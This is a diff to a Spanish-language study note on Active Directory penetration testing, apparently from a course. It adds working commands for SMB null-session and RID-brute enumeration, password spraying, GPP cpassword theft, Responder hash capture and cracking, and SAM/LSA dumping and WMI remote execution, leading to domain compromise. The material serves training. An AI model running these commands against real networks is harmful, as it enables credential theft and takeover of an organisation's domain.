@@ -26,6 +26,25 @@ nmap -p 389,636,88,445 --script ldap*,smb* <target>
 
 > [!important] Mapear usuarios, grupos y servicios
 
+### Sin credenciales (Fase 0 — BLOQUE 8)
+
+```bash
+# Null session / enumeración SMB sin credenciales
+nxc smb <IP_DC> -u '' -p '' --shares
+nxc smb <IP_DC> -u 'guest' -p '' --users
+
+# RID Brute (cuando --users no devuelve nada)
+nxc smb <IP_DC> -u '' -p '' --rid-brute
+# Filtrar solo usuarios de la salida:
+nxc smb <IP_DC> -u '' -p '' --rid-brute | grep "SidType User"
+
+# Password spraying con la lista de usuarios obtenida
+nxc smb <IP_DC> -u users.txt -p 'Password123' --no-brute force
+
+# Kerbrute: validar existencia de usuarios sin bloquear cuentas
+kerbrute userenum --dc <IP_DC> -d dominio.local users.txt
+```
+
 ### LDAP
 
 ```bash
@@ -40,6 +59,10 @@ ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" 
 
 # Groups
 ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn
+
+# Enumeración autenticada → HTML/JSON con usuarios (descripciones a veces
+# contienen contraseñas filtradas por error humano), equipos y grupos
+ldapdomaindump -u 'dominio.local\usuario' -p 'contrasena' <IP_DC>
 ```
 
 ### BloodHound
@@ -147,6 +170,31 @@ impacket-findDelegation <domain>/user:pass
 impacket-getST -spn cifs/<target> -impersonate administrator <domain>/user:pass
 ```
 
+### GPP Passwords en SYSVOL (BLOQUE 8)
+
+Las Group Policy Preferences guardan contraseñas en el share SYSVOL, legibles con cualquier cuenta de dominio:
+
+```bash
+# Buscar Groups.xml en el share replication/SYSVOL
+smbclient //<IP_DC>/SYSVOL -U usuario%pass
+# Dentro: cd Policies, buscar rutas tipo
+# Machine/Preferences/Groups/Groups.xml
+get Groups.xml
+# Descifrar el campo cpassword (la clave AES de Microsoft se filtró)
+```
+
+### Responder: captura de hashes NTLM (BLOQUE 8)
+
+Cuando un cliente Windows busca un recurso que no existe (`\\SERVIDOR\recurso`) y pregunta por difusión, Responder contesta "soy yo" y captura el hash NTLMv2:
+
+```bash
+sudo responder -I eth0
+# Log: /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
+
+# Crackear el hash capturado offline
+hashcat -m 5600 hash_capturado.txt /usr/share/wordlists/rockyou.txt
+```
+
 ---
 
 ## Fase 4: Movimiento Lateral
@@ -183,6 +231,21 @@ bloodyAD -d <domain> -u user -p pass --host <target> get writable --otype user
 bloodyAD -d <domain> -u user -p pass --host <target> set object target user msDS-AllowedToDelegateTo
 ```
 
+### Movimiento con credenciales validadas (BLOQUE 8)
+
+```bash
+# ¿En qué máquinas el usuario es admin local?
+# Los resultados marcados como (Pwn3d!) indican admin local en ese host
+nxc smb 192.168.10.0/24 -u usuario -p 'contrasena'
+
+# Volcar SAM/LSA en una máquina donde ya somos admin
+nxc smb <IP> -u usuario -p 'contrasena' --sam
+nxc smb <IP> -u usuario -p 'contrasena' --lsa
+
+# Ejecutar comandos remotos con WMI/SMB
+impacket-wmiexec dominio.local/usuario:contrasena@<IP>
+```
+
 ---
 
 ## Fase 5: Dominio Completo
@@ -197,6 +260,15 @@ bloodyAD -d <domain> -u user -p pass --host <target> set object target user msDS
 3. KRBTGT hash → Golden Ticket → Domain Admin
 4. Domain Admin → DCSync → Todos los hashes
 ```
+
+> [!important] CADENA COMPLETA (BLOQUE 5)
+> ```
+> Explotación inicial (servicio vulnerable) → Shell regular → Escalada local (SUID/Potato)
+> → Credenciales filtradas → Movimiento lateral → Domain Admin
+> ```
+> En Windows: exploits locales → credenciales → movimientos laterales → persistencia → objetivo.
+> En Linux: exploit → escalada (SUID/GTFOBins/cron) → root → flag.
+> **Cada sistema tiene su propio camino** — no hay una técnica universal; la clave es entender el sistema y encontrar las debilidades específicas de su configuración.
 
 ### Herramientas
 
@@ -232,11 +304,17 @@ Get-DomainComputer
 
 #checklist
 - [ ] Dominio identificado
-- [ ] Usuarios enumerados
+- [ ] Usuarios enumerados (incluye RID brute y Kerbrute si `--users` falla)
+- [ ] ldapdomaindump ejecutado (descripciones → contraseñas filtradas)
+- [ ] GPP/cpassword en SYSVOL buscado
 - [ ] Kerberoasting/AS-REP intentado
 - [ ] Pass-the-Hash probado
 - [ ] Delegation verificada
+- [ ] Responder lanzado y hash NTLMv2 capturado/craqueado (modo 5600)
+- [ ] Barrido nxc por `Pwn3d!` + volcado SAM/LSA
 - [ ] Domain Admin obtenido
+
+
 
 
 
@@ -250,15 +328,15 @@ Get-DomainComputer
 
 ### Documentos Relacionados
 
-- [[../comandos/Tmux.md|Tmux]] — Redes, Tmux, Windows
-- [[../comandos/Windows.md|Windows]] — Redes, Tmux, Windows
-- [[../comandos/SMB_Impacket.md|SMB_Impacket]] — Redes, Tmux, Windows
-- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Redes, Tmux, Windows
-- [[../../apuntes Joselu/MODULO3/resumen_master_clase51.md|resumen_master_clase51]] — Redes, Tmux, Windows
-- [[../../comandos/Windows.md|Windows]] — Redes, Tmux, Windows
+- [[../comandos/SMB_Impacket.md|SMB_Impacket]] — Linux, Linux, Windows
+- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Linux, Linux, Windows
+- [[../comandos/Windows.md|Windows]] — Linux, Linux, Windows
+- [[../comandos/Tmux.md|Tmux]] — Linux, Linux, Windows
+- [[../../comandos/Windows.md|Windows]] — Linux, Linux, Windows
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Tmux|Tmux]]
+- [[../../../redes/wpa2_wpa3.md|wpa2_wpa3]] — Redes: Criptografia, Linux, Redes
+- [[../../../programacion/R/fundamentos_r.md|fundamentos_r]] — Programacion: Criptografia, Redes
 
-> #linux #redes #tmux #windows
+> #crypto #linux #linux_ciber #redes #tmux #windows_ciber
